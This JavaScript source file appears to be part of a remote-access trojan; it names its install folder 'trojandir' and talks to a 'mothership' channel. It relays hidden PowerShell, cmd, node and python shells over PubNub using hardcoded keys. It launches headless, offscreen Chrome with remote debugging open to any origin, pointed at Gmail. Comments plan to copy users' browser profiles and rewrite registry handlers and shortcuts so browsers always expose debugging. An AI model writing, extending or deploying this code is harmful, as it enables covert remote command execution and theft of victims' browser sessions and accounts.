
class PubnubRelay {
    static PUBLISH_KEY = "pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc";
    static SUBSCRIBE_KEY = "sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd";

    #__pubnubConnection = null;

    #__enginename = "UNKNOWN";
    #__userid = "clientid_" + systemstate.clientid;

    #__payloads = []; // outgoing messages
    #__messages = []; // incomming messages

    constructor(enginename) {
        this.#__enginename = enginename;

        // TODO: log event/msg to mothership broadcasting that client has connected

        this.pubnubConnection.subscribe({
            channels: [this.client_channel, this.mothership_channel],
        });
    }

    get messages() {
        return this.#__messages;
    }

    get payloads() {
        if (!this.#__payloads) this.#__payloads = [];

        return this.#__payloads;
    }

    get mothership_channel() {
        return `clientid_${systemstate.clientid}_${this.enginename}_mothership`;
    }

    get client_channel() {
        return `clientid_${systemstate.clientid}_${this.enginename}_client`;
    }

    get pubnubConnection() {
        if (this.#__pubnubConnection) return this.#__pubnubConnection;

        let pubnubc = new PubNub({
            publishKey: PubnubRelay.PUBLISH_KEY,
            subscribeKey: PubnubRelay.SUBSCRIBE_KEY,
            userId: this.userid,
        });

        this.#__pubnubConnection = pubnubc;

        const channel = pubnubc.channel(this.mothership_channel);
        const subscription = channel.subscription();

        subscription.onMessage = (messageEvent) => {
            logmsg("[43Z8] Message event: " + JSON.stringify(messageEvent));
            this.messages.push(messageEvent);
            this.handleMessage(messageEvent);
        };

        subscription.subscribe();

        return this.#__pubnubConnection;
    }

    get userid() {
        return this.#__userid;
    }

    get enginename() {
        return this.#__enginename;
    }

    // override
    handleMessage(msgEvent) {
        logmsg("pass");
    }

    publishMessage(payload) {
        this.pubnubConnection
            .publish({
                channel: this.client_channel,
                message: payload,
            })
            .then((response) => {
                payload.response = response;

                this.payloads.push(payload);

                logmsg(
                    `[9U3A]: message sent -- timetoken: ${response.timetoken} payloads: ${this.payloads.length} -- client_channel: ${this.client_channel}`
                );
            })
            .catch((error) => {
                logmsg("Publish failed:", error);
            });
    }
}

function runpythonrelay(browser = "chrome") {
    let configfpath = path.join(
        systemconfig.trojandir,
        "pythonrelay.py_" + getRandomCode(8) + "_config.json"
    );

    let jsontext = JSON.stringify({
        browser: browser || "chrome",
        batchid: getRandomCode(8), // TODO why is batchid needed here?
    });

    fs.writeFileSync(configfpath, jsontext);

    // TODO check if python is installed, working

    return execPYTHONScript(
        path.join(systemconfig.trojandir, "pythonrelay.py"),
        [configfpath]
    );
}

function runpsrelay(pubnubo) {
    const child = spawn("powershell.exe", ["-NoProfile", "-Command", "-"], {
        shell: false,
        // detached: true, // causes problems
        windowsHide: true,
        cwd: "",
    });

    // CommandLine
    // Name
    // ProcessId

    child.stdout.on("data", (data) => {
        const str = Buffer.from(data).toString();

        helper.logmsg(`STDOUT: ${str}`);

        pubnubo.publishMessage({
            execresult: str,
            ts: getTimestamp(),
            responseid: getRandomCode(8),
        });
    });

    child.stdout.on("error", (err) => {
        helper.logmsg("STDOUT error:", err);
    });

    child.stderr.on("data", (data) => {
        const str = Buffer.from(data).toString();

        helper.logmsg(`STDERR: ${str}`);

        pubnubo.publishMessage({ execresult: str, ts: getTimestamp() });
    });

    child.stdin.on("error", (err) => {
        if (err.code === "EPIPE") {
            helper.logmsg("Subprocess closed stdin early; ignoring broken pipe.");
        } else {
            helper.logmsg("Unexpected STDIN error:", err);
        }
    });

    child.on("close", (code) => {
        helper.logmsg(`script engine exited with code ${code}`);
    });

    child.on("error", (err) => {
        helper.logmsg("Failed to start subprocess:", err);
    });

    helper.logmsg(
        `launched child pid=${child.pid} spawn args: ` +
        JSON.stringify(child.spawnargs)
    );

    // log event to mothership
    // TODO log to pubnub

    helper.logmsg("finished");

    return child;
}

function runnoderelay(pubnubo) {
    helper.logmsg("starting");

    const child = spawn(systemconfig.nodeexepath, ["-i"], {
        shell: false,
        detached: true,
        windowsHide: true,
        cwd: "",
    });

    // CommandLine
    // Name
    // ProcessId

    // [CADZ248S]: child.stdin.on --> wired up within relay() func
    // lookup [7SZOSMSP]

    child.stdout.on("data", (data) => {
        const str = Buffer.from(data).toString();

        helper.logmsg(`[5LKC] Output: ${str}`);

        pubnubo.publishMessage({
            execresult: str,
            ts: getTimestamp(),
            responseid: getRandomCode(8),
        });
    });

    child.stdout.on("error", (err) => {
        helper.logmsg("STDOUT error:", err);
    });

    child.stderr.on("data", (data) => {
        const str = Buffer.from(data).toString();

        helper.logmsg(`stderr: ${str}`);

        pubnubo.publishMessage({ execresult: str, ts: getTimestamp() });
    });

    child.stdin.on("error", (err) => {
        if (err.code === "EPIPE") {
            helper.logmsg("Subprocess closed stdin early; ignoring broken pipe.");
        } else {
            helper.logmsg("Unexpected STDIN error:", err);
        }
    });

    child.on("close", (code) => {
        helper.logmsg(`script engine exited with code ${code}`);
    });

    child.on("error", (err) => {
        helper.logmsg("Failed to start subprocess:", err);
    });

    helper.logmsg(
        `launched child pid=${child.pid} spawn args: ` +
        JSON.stringify(child.spawnargs)
    );

    // log event to mothership
    // TODO log to pubnub

    helper.logmsg("finished");

    return child;
}

function runbatrelay(pubnubo) {
    helper.logmsg("starting");

    const child = spawn("cmd.exe", [], {
        detached: true,
        windowsHide: true,
        stdio: ["pipe", "pipe", "pipe"],
        shell: false,
        cwd: systemconfig.trojandir,
    });

    // child.unref();

    // CommandLine
    // Name
    // ProcessId

    child.stdout.on("data", (data) => {
        helper.logmsg(`Output: ${data}`);

        const str = Buffer.from(data).toString();

        pubnubo.publishMessage({ execresult: str, ts: getTimestamp() });
    });

    child.stdout.on("error", (err) => {
        helper.logmsg("STDOUT error:", err);
    });

    child.stderr.on("data", (data) => {
        helper.logmsg(`Output: ${data}`);
        // TODO log to pubnub
    });

    child.stdin.on("error", (err) => {
        if (err.code === "EPIPE") {
            helper.logmsg("Subprocess closed stdin early; ignoring broken pipe.");
        } else {
            helper.logmsg("Unexpected STDIN error:", err);
        }
    });

    child.on("close", (code) => {
        helper.logmsg(`script engine exited with code ${code}`);
        // TODO log to pubnub
    });

    child.on("error", (err) => {
        helper.logmsg("Failed to start subprocess:", err);
    });

    helper.logmsg(
        `launched child pid=${child.pid} spawn args: ` +
        JSON.stringify(child.spawnargs)
    );

    // log event to mothership
    // TODO log to pubnub

    helper.logmsg("finished");

    return child;
}

function launchrelay(tenginename, tpubnubr, browsername) {
    helper.logmsg(`launching: ${tenginename} -- browsername=${browsername}`);

    if (tenginename == "JS") {
        tchildp = runnoderelay(tpubnubr);
    } else if (tenginename == "BAT") {
        tchildp = runbatrelay(tpubnubr);
    } else if (tenginename == "PS1") {
        tchildp = runpsrelay(tpubnubr);
    } else if (tenginename == "PY") {
        tchildp = runpythonrelay(browsername);
    } else if (tenginename == "VBS") {
        throw new Error("VBS relay is not supported");
    }

    return tchildp;
}


// anchor
function spawn_chrome(starturl='https://www.gmail.com/', debugport=9223, datadir=null) {

    datadir = datadir || path.join(systemconfig.trojandir, 'chrome');

    let cmdlineargs = [ 
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir=${datadir}`,
        `--new-window ${starturl}`,
        `--headless=new`,
        `--no-first-run`,
        `--no-default-browser-check`,
        `--profile-directory=Default`,
        `--remote-allow-origins=*`,
        `--restore-last-session`,
        `--ignore-certificate-errors`,
        `--window-position=2000,2000`,
        `--window-size=10,10`
    ];

    // TODO auto discover by reading chrome lnk files
    let chrome_exe_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"

    const child = spawn(
        chrome_exe_path,
        [ ...cmdlineargs ],
        {
            // detached: true, // might cause errors
            windowsHide: true,
            // stdio: ["ignore", out, err],
            // shell: false,
            // cwd: systemconfig.trojandir,
        }
    );

    child.stdout.on("data", (data) => {
        let text = data.toString();

        if (stdoutfunc) stdoutfunc(text);
        else helper.logmsg(text);
    });

    child.stderr.on("data", (data) => {
        let text = data.toString();

        if (stderrfunc) stderrfunc(text);
        else helper.logmsg(text);
    });

    child.on("close", (code) => {
        if (closefunc) closefunc(code);
        else helper.logmsg(`Child process exited with code ${code}`);
    });

    return child;
}

// start chrome --remote-debugging-port=9223 --user-data-dir=C:\Users\LC2022\AppData\Local\Google\test\chrome
function chrome_cmdlineargs(
    starturl = "https://www.yahoo.com",
    debugport = 9223,
    datadir = `C:\\Users\\${systemconfig.username}\\AppData\\Local\\Google\\test\\chrome`,
    x_pos = 0,
    y_pos = 0,
    width = 1920,
    height = 1080,
    ignorecert = false,
    restore = false,
    headless = false
) {
    datadir = datadir.trim();

    let cmdlineargs = [
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir=${datadir}`,
        `--disable-notifications`,
        `--noerrdialogs`,
        `--disable-infobars`,
        `--disable-session-crashed-bubble`,
        //`--disable-popup-blocking`,
        `--suppress-message-center-popups`,
        headless ? `--headless=new` : "",
        `--no-first-run`, // You can skip Chrome's welcome and setup screens
        `--no-default-browser-check`,
        `--disable-signin-promo`,
        //`--profile-directory="Profile 1"`,
        //`--profile-directory=Default`,
        `--remote-allow-origins=*`,
        restore ? `--restore-last-session` : null,
        ignorecert ? `--ignore-certificate-errors` : null,
        `--window-position=${x_pos},${y_pos}`,
        `--window-size=${width},${height}`,
        `--hide-crash-restore-bubble`,
        `--disable-features=WelcomePage,PrivacySandboxSettings4`,
        `--new-window`,
        starturl,
    ];

    let ret = cmdlineargs.filter((item) => {
        return !helper.helper.isNullOrWhitespace(item);
    });

    return ret;
}

// TODO
async function __setup_chrome_relay() {

    // 1. modify shotfut lnk file in taskbar, start menu, and desktop
    // 2. modify registry paths as needed (doesn't work on TPL for that specific path)
    // 3. robocopy user data dir
    // 4. execute curl test

    // chrome rdp mods
    // robocopy "C:\Users\sebas\AppData\Local\Google\Chrome\User Data" C:\ProgramData\owd\chrome /E /R:0 /W:0
    // "C:\Program Files\Google\Chrome\Application\chrome.exe" --user-data-dir="C:\ProgramData\owd\chrome" --profile-directory=Default --remote-allow-origins=* --restore-last-session --ignore-certificate-errors --remote-debugging-port=9223
    // HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command
    // "C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 -- "%1"
    // reg add HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command /ve /t REG_SZ /d "\"C:\Program Files\Google\Chrome\Application\chrome.exe\" --remote-debugging-port=9223 -- \"^%1\"" /f
    // "C:\Program Files\Google\Chrome\Application\chrome.exe"
    // "HKLM:\Software\Classes\ChromeHTML\shell\open\command"
    //    Get-ItemProperty -Path "HKCR:\ChromeHTML\shell\open\command"                  --> returned empty
    //    Get-ItemProperty -Path "HKCU:\Software\Classes\ChromeHTML\shell\open\command" --> returned empty
    //    Get-ItemProperty -Path "HKLM:\Software\Classes\ChromeHTML\shell\open\command"
    // ! was not able to modify reg using reg cmd or powershell -- attempt using VBScript

    /*
    (default)    : "C:\Program Files\Google\Chrome\Application\chrome.exe" --single-argument %1
    PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Classes\ChromeHTML\shell\open\command
    PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Classes\ChromeHTML\shell\open
    PSChildName  : command
    PSDrive      : HKLM
    PSProvider   : Microsoft.PowerShell.Core\Registry
    */

    // msedge rdp mods
    // robocopy "C:\Users\sebas\AppData\Local\Microsoft\Edge\User Data" C:\ProgramData\owd\msedge /E /W:0
    // msedge.exe --remote-debugging-port=9222 --user-data-dir="C:\ProgramData\owd\msedge"
    // reg add "HKLM\Software\Policies\Microsoft\Edge" /v "RemoteDebuggingAllowed" /t REG_DWORD /d 1 /f > %workdir%\mod_msedge.bat
    // reg add "HKCU\Software\Policies\Microsoft\Edge\WebView2\AdditionalBrowserArguments" /v "msedge.exe" /t REG_SZ /d "--remote-debugging-port=9222" /f >> %workdir%\mod_msedge.bat
    // Startup-Boost: Pre-loads portions of msedge upon system boot so the application
    // opens instantly on demand
    // reg add HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command /ve /t REG_SZ /d "\"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe\" --remote-debugging-port=9222 -- \"^%1\"" /f
    // HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    // MicrosoftEdgeAutoLaunch_5B148DE90C207DD5EDAA5B34E614DD84    REG_SZ    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --win-session-start
    // C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk
    // C:\Users\sebas\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk
    // taskkill /F /IM msedge.exe
    // start "" /min "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --remote-debugging-port=9222 --profile-directory=Default "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --remote-debugging-port=9222 --profile-directory=Default --remote-allow-origins=* --restore-last-session --user-data-dir="C:\ProgramData\owd\msedge"

    // shortcut folders
    // %AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
    // %ProgramData%\Microsoft\Windows\Start Menu\Programs
    // C:\Users\sebas\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar

    // Desktop Shortcut:             C:\Users\<YourUsername>\Desktop
    // Start Menu:                   C:\Users\<YourUsername>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
    // Taskbar Pinned Items:         C:\Users\<YourUsername>\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
    // Chrome App/Website Shortcuts: C:\Users\<YourUsername>\AppData\Local\Google\Chrome\User Data\Default\Web Applications

    // HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice
    // HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice

    // curl -v -G http://localhost:9223/json
    // curl -s http://localhost:9223/json/list | findstr webSocketDebuggerUrl | findstr ws://
}
